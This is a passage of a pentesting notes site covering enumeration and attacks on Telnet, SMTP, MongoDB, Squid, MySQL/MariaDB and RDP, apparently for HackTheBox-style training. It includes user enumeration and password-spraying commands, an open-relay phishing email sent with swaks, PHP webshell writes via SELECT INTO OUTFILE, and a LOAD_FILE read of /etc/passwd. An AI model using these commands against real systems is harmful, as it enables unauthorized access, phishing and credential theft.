yes</code> Displays a specific banner when logging in. <p>Some instructions and hardening guides can be used to harden our SSH servers.</p>","tags":["pentesting","web","pentesting","port","22"]},{"location":"23-telnet/","title":"23 telnet","text":"<p>Sometimes, due to configuration mistakes, some important accounts can be left with blank passwords for the sake of accessibility. This is a significant issue with some network devices or hosts, leaving them open to simple brute-forcing attacks, where the attacker can try logging in sequentially, using a list of usernames with no password input. Some typical important accounts have self-explanatory names, such as:</p> <ul> <li>admin</li> <li>administrator</li> <li>root</li> </ul> <p>A direct way to attempt logging in with these credentials in hopes that one of them exists and has a blank password is to input them manually in the terminal when the hosts request them. If the list were longer, we could use a script to automate this process, feeding it a wordlist for usernames and one for passwords.</p> <p>Typically, the wordlists used for this task consist of typical people names, abbreviations, or data from previous database leaks. For now, we can resort to manually trying these three main usernames above.</p>","tags":["telnet","port 23"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/","title":"Ports 25, 565, 587 - Simple Mail Tranfer Protocol (SMTP)","text":"<p>Related resources</p> <ul> <li>POP3/IMAP4 protocol</li> </ul> <p>The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. By default, SMTP servers accept connection requests on port 25. However, newer SMTP servers also use other ports such as TCP port 587. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command. SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port 25 for the encrypted connection, for example, TCP port 465.</p> <p></p> <p><code>Mail User Agent</code> (<code>MUA</code>): SMTP client who sends the email. MUA converts it into a  header and a body and uploads both to the SMTP server. </p> <p><code>Mail Submission Agent</code>\u00a0(<code>MSA</code>), which checks the validity, i.e., the origin of the e-mail. This\u00a0<code>MSA</code>\u00a0is also called\u00a0<code>Relay</code>\u00a0server. These are very important later on, as the so-called\u00a0<code>Open Relay Attack</code>. Proxy that occasionally precedes the MTA to relieve the load. It checks the validity, i.e., the origin of the e-mail. This <code>MSA</code> is also called <code>Relay</code> server.  </p> <p><code>Mail Transfer Agent</code> (<code>MTA</code>):  The MTA checks the e-mail for size and spam and then stores it. At this point of the process, this MTA works as the sender's server. The MTA then searches the DNS for the IP address of the recipient mail server. On arrival at the destination SMTP server, the receiver's MTA reassembles the data packets to form a complete e-mail.</p> <p><code>Mail delivery agent</code> (<code>MDA</code>): It deals with transferring the email to the recipient's mailbox.</p> <p>Other concepts:</p> <ul> <li>DKIM : DomainKeys Identified Mail (DKIM)  provides a method for validating a domain name identity that is associated with a message through cryptographic authentication. The identity is independent of other email identities, such as the author's From: field.</li> <li>Sender Policy Framework\u00a0(<code>SPF</code>): Sender\u00a0Policy\u00a0Framework (SPF) is used to authenticate the sender of an email. With an SPF record in place, Internet Service Providers can verify that a mail server is authorized to send email for a specific domain. An SPF record is a DNS TXT record containing a list of the IP addresses that are allowed to send email on behalf of your domain.</li> </ul>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#extended-smtp-esmtp","title":"Extended SMTP (ESMTP)","text":"<p>Extended SMTP (ESMTP) deals with the main two shortcomings of SMTP protocol: </p> <ul> <li>In SMTP, users are not authenticated, therefore the sender is unreliable.</li> <li>SMTP doesn't have confirmations.</li> </ul> <p>For this, ESMTP uses TLS for encryption and AUTH PLAIN extension for authentication. See also Postfix</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#basic-commands","title":"Basic commands","text":"<pre><code># We can use telnet protocol to connect to a SMTP server\ntelnet $ip 25\n\n# AUTH is a service extension used to authenticate the client\nAUTH PLAIN  \n\n# The client logs in with its computer name and thus starts the session. It also lists all available commands\nEHLO\n    # Example: \n    # HELO mail1.inlanefreight.htb\n\n# The client names the email sender\nMAIL FROM   \n\n# The client names the email recipient\nRCPT TO\n\n# The client initiates the transmission of the email\nDATA \n\n# The client aborts the initiated transmission but keeps the connection between client and server\nRSET\n\n# The client checks if a mailbox is available for message transfer. This also means that this command could  be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue `code 252` and confirm the existence of a user that does not exist on the system.\nVRFY\n# Example: VRFY root\n\n# The client also checks if a mailbox is available for messaging with this command \nEXPN\n\n# The client requests a response from the server to prevent disconnection due to time-out\nNOOP\n\n# The client terminates the session\nQUIT\n</code></pre> <p>If we are connected to a proxy and we want this proxy to connect to a SMTP server, the command that we would send than would look something like this: </p> <pre><code>CONNECT 10.129.14.128:25 HTTP/1.0\n</code></pre> <p>Example:</p> <pre><code>telnet $ip 25  \n\n# Trying 10.129.14.128... \u00e7\n# Connected to 10.129.14.128. \n# Escape character is '^]'. \n# 220 ESMTP Server   \n\nEHLO inlanefreight.htb  \n# 250-mail1.inlanefreight.htb \n# 250-PIPELINING \n# 250-SIZE 10240000 \n# 250-ETRN \n# 250-ENHANCEDSTATUSCODES \n# 250-8BITMIME \n# 250-DSN \n# 250-SMTPUTF8 \n# 250 CHUNKING   \n\nMAIL FROM: &lt;cry0l1t3inlanefreight.htb&gt;  \n# 250 2.1.0 Ok   \n\nRCPT TO: &lt;mrb3n@inlanefreight.htb&gt; NOTIFY=success,failure  \n# 250 2.1.5 Ok   \n\nDATA  \n# 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;  \n\n# From: &lt;cry0l1t3@inlanefreight.htb&gt; \n# To: &lt;mrb3n@inlanefreight.htb&gt; \n# Subject: DB \n# Date: Tue, 28 Sept 2021 16:32:51 +0200 \n\n`Hey man, I am trying to access our XY-DB but the creds dont work.  Did you make any changes there?.`  \n# 250 2.0.0 Ok: queued as 6E1CF1681AB   \n\nQUIT  \n# 221 2.0.0 Bye Connection closed by foreign host.`\n</code></pre> <pre><code>mynetworks = 0.0.0.0/0\n</code></pre> <p>With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#footprinting-smtp","title":"Footprinting SMTP","text":"<pre><code>sudo nmap $ip -sC -sV -p25\n\nsudo nmap $ip -p25 --script smtp-open-relay -v\n</code></pre> Port Service <code>TCP/25</code> SMTP Unencrypted <code>TCP/143</code> IMAP4 Unencrypted <code>TCP/110</code> POP3 Unencrypted <code>TCP/465</code> SMTP Encrypted <code>TCP/587</code> SMTP Encrypted/STARTTLS <code>TCP/993</code> IMAP4 Encrypted <code>TCP/995</code> POP3 Encrypted","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#enumeration","title":"Enumeration","text":"<p>When it comes to enumeration it is critical to understand if we are facing a cloud service or a custom mail server implementation. </p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#custom-mail-server-implementation","title":"Custom mail server implementation","text":"<p>We will focus on typical misconfigurations</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#user-enumeration-with-commands","title":"User enumeration with commands","text":"<p>The SMTP server has different commands that can be used to enumerate valid usernames\u00a0<code>VRFY</code>,\u00a0<code>EXPN</code>, and\u00a0<code>RCPT TO</code>. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password.</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#vrfy","title":"VRFY","text":"<p>First we try to connect to the server:</p> <pre><code>telnet $ip 25\n</code></pre> <p>If anonymous login is enabled, we are in. Otherwise we could try to login, for instance with user <code>root</code>:</p> <pre><code>VFFY root\n</code></pre> <p>The code 252 in the answer means that the user exists. The code 550 means that it is an unknown user. </p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#expn","title":"EXPN","text":"<p><code>EXPN</code>\u00a0is similar to\u00a0<code>VRFY</code>, except that when used with a distribution list.  First we try to connect to the server:</p> <pre><code>telnet $ip 25\n</code></pre> <p>Then we try to list all users on that distribution list with EXPN:</p> <pre><code>EXPN support-team\n</code></pre> <p>A typical response could be:</p> <pre><code>250 2.0.0 carol@inlanefreight.htb\n250 2.1.5 elisa@inlanefreight.htb\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#rcpt-to-command","title":"RCPT TO Command","text":"<p><code>RCPT TO</code> identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.</p> <p>First we try to connect to the server:</p> <pre><code>telnet $ip 25\n</code></pre> <p>Then we attempt the <code>RCPT TO</code> command:</p> <pre><code>MAIL FROM:test@htb.com\nit is\n250 2.1.0 test@htb.com... Sender ok\n\n\nRCPT TO:julio\n\n550 5.1.1 julio... User unknown\n\n\nRCPT TO:kate\n\n550 5.1.1 kate... User unknown\n\n\nRCPT TO:john\n\n250 2.1.5 john... Recipient ok\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#user","title":"USER","text":"<p>We can also use the\u00a0<code>POP3</code>\u00a0protocol to enumerate users depending on the service implementation. For example, we can use the command\u00a0<code>USER</code>\u00a0followed by the username, and if the server responds\u00a0<code>OK</code>. This means that the user exists on the server. First we try to connect to the server:</p> <pre><code>telnet $ip 25\n</code></pre> <p>Then we attempt the <code>USER</code> command:</p> <pre><code>USER julio\n-ERR\n\n\nUSER john\n+OK\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#user-enumeration-with-commands_1","title":"User enumeration with commands","text":"<p>A way to automate this enumeration is this script for user enumeration:</p> <pre><code># Enumerate users:\nfor user in $(cat users.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done\n# -w: Include a delay in passing the argument. In seconds.\n</code></pre> <p>Results from script in user enumeration:</p> <pre><code>(UNKNOWN) [10.129.16.141] 25 (smtp) open\n220 InFreight ESMTP v2.11\n252 2.0.0 root\n(UNKNOWN) [10.129.16.141] 25 (smtp) open\n220 InFreight ESMTP v2.11\n550 5.1.1 &lt;lala&gt;: Recipient address rejected: User unknown in local recipient table\n(UNKNOWN) [10.129.16.141] 25 (smtp) open\n220 InFreight ESMTP v2.11\n550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown in local recipient table\n(UNKNOWN) [10.129.16.141] 25 (smtp) open\n220 InFreight ESMTP v2.11\n252 2.0.0 robin                 \n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#smtp-user-enum","title":"smtp-user-enum","text":"<p>Username guessing tool primarily for use against the default Solaris SMTP service. Can use either EXPN, VRFY or RCPT TO.</p> <p>Repo: https://github.com/pentestmonkey/smtp-user-enum</p> <p>Basic usage:</p> <pre><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $ip\n# -M: Enumeration mode, it can be\u00a0`VRFY`,\u00a0`EXPN`, or\u00a0`RCPT`\n# -U: file with list of users\n# -D: domain\n# -t: target\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#cloud-mail-server-implementation","title":"Cloud mail server implementation","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#enumerating-users-in-microsoft-office-365-o365","title":"Enumerating users in Microsoft Office 365 (O365)","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#o365spray","title":"O365spray","text":"<p>O365spray\u00a0is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques.</p> <pre><code>sudo pip install -r requirements.txt\n</code></pre> <p>Basic usage:</p> <pre><code># First validate if our target domain is using Office 365.\npython3 o365spray.py --validate --domain msexample.com\n\n# Attempt to identify usernames.\npython3 o365spray.py --enum -U users.txt --domain msexample.com\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#password-attacks","title":"Password Attacks","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#custom-mail-servers","title":"Custom mail servers","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#hydra","title":"hydra","text":"<pre><code># Attacking a pop3 service\nhydra -L users.txt -p 'Company01!' -f $ip pop3\n\nhydra -l user@inlanefreight.htb -P passwords.list -t 64 -f $ip smtp\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#cloud-mail-services","title":"Cloud mail services","text":"<p>If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like\u00a0<code>Hydra</code>, but these tools are usually blocked.</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#msoffice-365","title":"MSOffice 365","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#o365spray_1","title":"O365spray","text":"<p>See O365spray</p> <pre><code># First validate if our target domain is using Office 365.\npython3 o365spray.py --validate --domain msexample.com\n\n# Password spraying technique \npython3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msexample.com\n</code></pre>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#mailsniper","title":"MailSniper","text":"<p>See MailSniper</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#gmail-and-okta","title":"Gmail and Okta","text":"<p>CredKing</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#open-relay-attack","title":"Open relay attack","text":"<p>An open relay is a Simple Mail Transfer Protocol (<code>SMTP</code>) server, which is improperly configured and allows an unauthenticated email relay.</p> <p>First, identify if an SMTP port allows an open relay:</p> <pre><code>nmap -p25 -Pn --script smtp-open-relay $ip\n</code></pre> <p>Next, we can use any mail client to connect to the mail server and send our email.</p> <pre><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $ipSMTPServerVictim\n</code></pre> <p>See swaks.</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#attacks-on-smtpd","title":"Attacks on SMTPD","text":"<p>Affected version: \u00a0OpenSMTPD\u00a0up to version 6.6.2 Vulnerability: CVE-2020-7247\u00a0and leads to RCE.</p> <p>The vulnerability in this service lies in the program's code, namely in the function that records the sender's email address. This offers the possibility of escaping the function using a semicolon (<code>;</code>) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found\u00a0here. Exploit here</p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#postfix-an-example-of-a-smtp-server","title":"Postfix, an example of a SMTP server","text":"","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"25-565-587-simple-mail-tranfer-protocol-smtp/#configuration-file","title":"Configuration file","text":"<p>See how to install postfix server.</p> <p>The configuration file for Porsfix service is <code>/etc/postfix/main.cf</code></p>","tags":["port 25","port 465","port 587","SMTP","Simple Mail Transfer Protocol"]},{"location":"27017-27018-mongodb/","title":"27017 - 27018 mongoDB","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb.</p> <p>More about mongo.</p>","tags":["mongodb","port 27017","port 27018"]},{"location":"27017-27018-mongodb/#description","title":"Description","text":"<p>27017 - The default port for mongod and mongos instances. You can change this port with port or --port.27018  - The default port for mongod when running with --shardsvr command-line option or the shardsvr value for the clusterRole setting in a configuration file. MongoDB is an open source database management system (DBMS) that uses a document-oriented database model which supports various forms of data. </p>","tags":["mongodb","port 27017","port 27018"]},{"location":"27017-27018-mongodb/#to-connect-to-a-mongodb","title":"To connect to a MongoDB","text":"<p>More about mongo.</p> <p>By default mongo does not require password. Admin is a common mongo database default admin user.</p> <pre><code>mongo $ip\nmongo &lt;HOST&gt;:&lt;PORT&gt;\nmongo &lt;HOST&gt;:&lt;PORT&gt;/&lt;DB&gt;\nmongo &lt;database&gt; -u &lt;username&gt; -p '&lt;password&gt;'\n</code></pre>","tags":["mongodb","port 27017","port 27018"]},{"location":"27017-27018-mongodb/#some-mongodb-commands","title":"Some MongoDB commands","text":"<p>More about mongo.</p> <pre><code># Enter in mongodb application\nmongo\n\n# See help\nhelp\n\n# Display databases\nshow dbs\n\n# Select a database\nuse &lt;db&gt;\n\n# Display collections in a database\nshow collections\n\n# Dump a collection\ndb.&lt;collection&gt;.find()\n\n# Return the number of records of the collection\ndb.&lt;collection&gt;.count() \n\n# Find in current db the username admin\ndb.current.find({\"username\":\"admin\"}) \n\n# We can dump the contents of the documents present in the flag collection by using the db.collection.find() command. Let's replace the collection name flag in the command and also use pretty() in order to receive the output in a beautified format.\n</code></pre>","tags":["mongodb","port 27017","port 27018"]},{"location":"3128-squid/","title":"3128 Squid","text":"<p>Squid is a caching and forwarding HTTP web proxy. It has a wide variety of uses, including speeding up a web server by caching repeated requests, caching web, DNS and other computer network lookups for a group of people sharing network resources, and aiding security by filtering traffic.</p> <p>Squid is a widely used open-source proxy server and web cache daemon. It primarily operates as a proxy server, which means it acts as an intermediary between client devices (such as computers or smartphones) and web servers, facilitating requests and responses between them. </p> <p>Squid is commonly deployed in network environments to improve performance, enhance security, and manage internet access. Squid can cache frequently requested web content locally. When a client requests a web page or object that Squid has cached, it serves the content from its cache instead of fetching it from the original web server.</p> <p>Access Control: Squid provides robust access control mechanisms. Administrators can configure rules to control which clients are allowed to access specific websites or web services. </p> <p>Content Filtering: Squid can be used for content filtering and blocking access to specific websites or categories of websites (e.g., social media, adult content). This feature is often used by organizations to enforce acceptable use policies.</p>","tags":["pentesting","web pentesting","port 3128","proxy"]},{"location":"3128-squid/#enumeration","title":"Enumeration","text":"<pre><code># Proxify curl\ncurl -x -proxy http://$ip$:3128 http://$ip$ -H \"User-Agent:Firefox\"\n</code></pre>","tags":["pentesting","web pentesting","port 3128","proxy"]},{"location":"3306-mariadb-mysql/","title":"3306 mariaDB - mySQL","text":"","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#description","title":"Description","text":"<p>MySQL: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.</p> <p>MariaDB: MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.</p> <pre><code>sudo nmap $ip -sV -sC -p3306 --script mysql*\n</code></pre> <pre><code>sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#connect-to-database-mariadb","title":"Connect to database: mariadb","text":"<pre><code># -h host/ip   \n# -u user As default mariadb has a root user with no authentication\nmariadb -h &lt;host/IP&gt; -u root\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#connect-to-database-mysql","title":"Connect to database: mysql","text":"","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#from-linux","title":"From Linux","text":"<pre><code>mysql -u username -pPassword123 -h $ip\n# -h host/ip   \n# -u user As default mysql has a root user with no authentication\n\nmysql --host=INSTANCE_IP --user=root --password=thepassword\nmysql -h &lt;host/IP&gt; -u root -p&lt;password&gt;\nmysql -u root -h &lt;host/IP&gt;\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#sqsh","title":"sqsh","text":"<pre><code># Targeting a local account:\nsqsh -S $ip -U &lt;username&gt; -P 'MyPassword!' -h\n\n# Targeting Windows authentication\nsqsh -S $ip -U .\\\\username -P 'MyPassword!' -h\n# -h: disable headers and footers for a cleaner look.\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#mssqlclientpy-from-impacket","title":"mssqlclient.py from impacket","text":"<pre><code>mssqlclient.py -p $port username@$ip \n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>python3 mssqlclient.py Administrator@$ip -windows-auth  \n# With python3 mssqlclient.py help you can see more options.\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#from-windows","title":"From windows","text":"","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#mysqlexe","title":"mysql.exe","text":"<pre><code>mysql.exe -u username -pPassword123 -h $IP\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#sqlcmd","title":"sqlcmd","text":"<pre><code>sqlcmd -S &lt;server&gt; -U &lt;username&gt; -P 'MyPassword!' -y 30 -Y 30\n# When we authenticate to MSSQL using\u00a0`sqlcmd`\u00a0we can use the parameters\u00a0`-y`\u00a0(SQLCMDMAXVARTYPEWIDTH) and\u00a0`-Y`\u00a0(SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#mariadb-basic-commands","title":"Mariadb basic commands","text":"<pre><code># Get all databases\nshow databases;\n\n# Select a database\nuse &lt;databaseName&gt;;\n\n# Get all tables from the previously selected database\nshow tables; \n\n# Dump columns from a table\ndescribe &lt;table_name&gt;;\n\n# Dump columns from a table\nshow columns from &lt;table&gt;;\n\n# Select column from table\nselect usename,password from users;\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#mysql-basic-commands","title":"mysql basic commands","text":"<p>See mysql.</p> <pre><code># Show datases\nSHOW databases;\n\n# Show tables\nSHOW tables;\n\n# Create new database\nCREATE DATABASE nameofdatabase;\n\n# Delete database\nDROP DATABASE nameofdatabase;\n\n# Select a database\nUSE nameofdatabase;\n\n# Show tables\u00e7\nSHOW tables;\n\n# Dump content from nameOftable\nSELECT * FROM NameOfTable\n\n# Create a table with some columns in the previously selected database\nCREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);\n\n# Modify, add, or remove a column attribute of a table\nALTER TABLE persona MODIFY edad VARCHAR(200);\nALTER TABLE persona ADD description VARCHAR(200);\nALTER TABLE persona DROP edad VARCHAR(200);\n\n# Insert a new row with values in a table\nINSERT INTO persona VALUES(\"alvaro\", 54, 1);\n\n# Show all rows from table\nSELECT * FROM persona\n\n# Select a row from a table filtering by the value of a given column\nSELECT * FROM persona WHERE nombre=\"alvaro\";\n\n# JOIN query\nSELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;\n\n# UNION query. This means, for an attack, that the number of columns has to be the same\nSELECT * FROM oficina UNION SELECT * from persona;\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#enumeration-queries","title":"Enumeration queries","text":"<pre><code># Show current user\ncurrent_user()\nuser()\n\n# Show current database\ndatabase()\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#command-execution","title":"Command execution","text":"","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#upload-a-shell","title":"Upload a shell","text":"<p>Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.</p> <pre><code>Select \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\" into outfile \"/var/www/https/blogblog/wp-content/uploads/shell.php\";\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#writing-files","title":"Writing files","text":"<p><code>MySQL</code>\u00a0supports\u00a0User Defined Functions\u00a0which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this\u00a0GitHub repository.</p> <p><code>MySQL</code>\u00a0does not have a stored procedure like\u00a0<code>xp_cmdshell</code>, but we can achieve command execution if we write to a location in the file system that can execute our commands. So basically, we need to check if we have enough privileges to do so. </p> <p>In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT \u2026 INTO OUTFILE statements and the LOAD_FILE() function. </p> <p>If <code>secure_file_priv</code>\u00a0is set as:</p> <ul> <li>set to NUL: the server disables import and export operations. We can't do anything.</li> <li>set to the name of a directory: the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li> <li>is empty: the variable has no effect, which is not a secure setting. </li> </ul> <p>Example:</p> <pre><code>mysql&gt; show variables like \"secure_file_priv\";\n\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n\n1 row in set (0.005 sec)\n</code></pre> <p>Now, as for demo purposes, let's imagine that <code>MySQL</code>\u00a0operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, we will attempt to write a file using\u00a0SELECT INTO OUTFILE\u00a0in the webserver directory. </p> <pre><code># Browse to the location where the file is and execute the commands.\n SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php';\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#reading-files","title":"Reading files","text":"","tags":["mariadb","port 3306","mysql"]},{"location":"3306-mariadb-mysql/#mysql-read-local-files-in-mysql","title":"MySQL - Read Local Files in MySQL","text":"<p>If permissions allows it:</p> <pre><code>select LOAD_FILE(\"/etc/passwd\");\n</code></pre>","tags":["mariadb","port 3306","mysql"]},{"location":"3389-rdp/","title":"Port 3389 - Remote Desktop Protocol (RDP)","text":"Sources for these notes <ul> <li>HacktheBox Academy</li> <li>Hacktricks.</li> </ul>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#description","title":"Description","text":"<p>Basic information about RDP service: Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software (from here).</p> Name Description port 3389/TCP state open service ms-wbt-server version Microsoft Terminal Services Banner rdp-ntlm-info <p>RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration. The <code>Remote Desktop</code> service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the <code>Server Manager</code> and comes with the default setting to allow connections to the service only to hosts with Network level authentication (<code>NLA</code>).</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#enumeration","title":"Enumeration","text":"<p>Footprinting the service:</p> <pre><code>nmap -Pn -p3389 $ip \n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#rdp-sec-checkpl","title":"rdp-sec-check.pl","text":"<p>rdp-sec-check.pl is a perl script to enumerate security settings of an RDP Service (AKA Terminal Services).</p> <pre><code>git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &amp;&amp; cd rdp-sec-check\n\n./rdp-sec-check.pl $ip\n</code></pre>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#connection-with-rdp","title":"Connection with rdp","text":"<p>To run Microsoft\u2019s Remote Desktop Protocol (RDP) client, a command-line interface called Microsoft Terminal Services Client (MSTSC) is used.  We can connect to RDP servers on Linux using xfreerdp, rdesktop, or Remmina and interact with the GUI of the server accordingly.</p>","tags":["rdp","port","3389","mimikatz"]},{"location":"3389-rdp/#xfreerdp","title":"xfreerdp","text":"<p>See xfreerdp.</p> <p>We can first try to form an RDP session with the target by not providing any additional information for any switches other than the target IP address. This will make the script use your own username as the login username for the RDP session, thus testing guest login capabilities.</p> <pre><code>xfreerdp /v:$ip\n# /v:$ip: Specifies the target IP of the host we would like to connect to.\n</code></pre> <p>Try to login with other default accounts, such as user, admin, Administrator, and so on.  We will also be specifying to the script that we would like to bypass all requirements for a security certificate so that our own script does not request them:</p> <pre><code>xfreerdp /cert:ignore /u:Administrator /v:$ip\n# 